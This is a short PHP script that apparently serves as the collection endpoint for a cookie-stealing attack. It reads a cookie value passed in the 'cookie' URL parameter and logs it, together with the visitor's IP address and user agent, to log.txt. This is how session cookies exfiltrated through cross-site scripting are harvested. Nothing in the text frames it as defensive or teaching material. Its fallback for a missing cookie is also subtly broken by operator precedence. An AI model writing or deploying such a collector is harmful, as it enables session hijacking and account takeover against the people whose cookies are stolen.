<?php
$log = "IP: " . $_SERVER['REMOTE_ADDR'];
$log .= " | User-Agent: " . $_SERVER['HTTP_USER_AGENT'];
$log .= " | Cookie: " . $_GET['cookie'] ?? 'none';
$log .= "\n";
file_put_contents("log.txt", $log, FILE_APPEND);
?>
